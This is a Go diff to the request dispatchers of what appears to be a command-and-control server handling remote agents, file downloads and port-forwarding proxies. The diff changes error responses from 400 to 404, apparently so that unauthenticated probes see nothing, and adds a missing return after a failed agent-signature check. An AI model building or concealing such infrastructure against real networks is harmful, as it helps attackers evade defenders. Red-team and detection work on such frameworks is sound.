@@ -27,7 +27,7 @@ func apiDispatcher(wrt http.ResponseWriter, req *http.Request) {
 
 	if vars["api"] == "" || vars["token"] == "" {
 		logging.Debugf("Invalid request: %v, missing api/token", req)
-		wrt.WriteHeader(http.StatusBadRequest)
+		wrt.WriteHeader(http.StatusNotFound)
 		return
 	}
 
@@ -35,16 +35,18 @@ func apiDispatcher(wrt http.ResponseWriter, req *http.Request) {
 	agent_sig, err := base64.URLEncoding.DecodeString(req.Header.Get("AgentUUIDSig"))
 	if err != nil {
 		logging.Debugf("Failed to decode agent sig: %v", err)
-		wrt.WriteHeader(http.StatusBadRequest)
+		wrt.WriteHeader(http.StatusNotFound)
 		return
 	}
 	isValid, err := transport.VerifySignatureWithCA([]byte(agent_uuid), agent_sig)
 	if err != nil {
 		logging.Debugf("Failed to verify agent uuid: %v", err)
+		wrt.WriteHeader(http.StatusNotFound)
+		return
 	}
 	if !isValid {
 		logging.Debugf("Invalid agent uuid, refusing request")
-		wrt.WriteHeader(http.StatusBadRequest)
+		wrt.WriteHeader(http.StatusNotFound)
 		return
 	}
 	logging.Debugf("Header: %v", req.Header)
@@ -65,10 +67,10 @@ func apiDispatcher(wrt http.ResponseWriter, req *http.Request) {
 				return
 			}
 		}
-		wrt.WriteHeader(http.StatusBadRequest)
+		wrt.WriteHeader(http.StatusNotFound)
 	case transport.FileAPI:
 		if !agents.IsAgentExistByTag(token) {
-			wrt.WriteHeader(http.StatusBadRequest)
+			wrt.WriteHeader(http.StatusNotFound)
 			return
 		}
 		path := filepath.Clean(req.URL.Query().Get("file_to_download"))
@@ -83,7 +85,7 @@ func apiDispatcher(wrt http.ResponseWriter, req *http.Request) {
 	case transport.ProxyAPI:
 		handlePortForwarding(network.ProxyStream, wrt, req)
 	default:
-		wrt.WriteHeader(http.StatusBadRequest)
+		wrt.WriteHeader(http.StatusNotFound)
 	}
 }
 
@@ -114,6 +116,6 @@ func operationDispatcher(w http.ResponseWriter, r *http.Request) {
 	case transport.OperatorListConnectedAgents:
 		handleListAgents(w, r)
 	default:
-		http.Error(w, fmt.Sprintf("Invalid API: %s", api), http.StatusBadRequest)
+		http.Error(w, fmt.Sprintf("Invalid API: %s", api), http.StatusNotFound)
 	}
 }
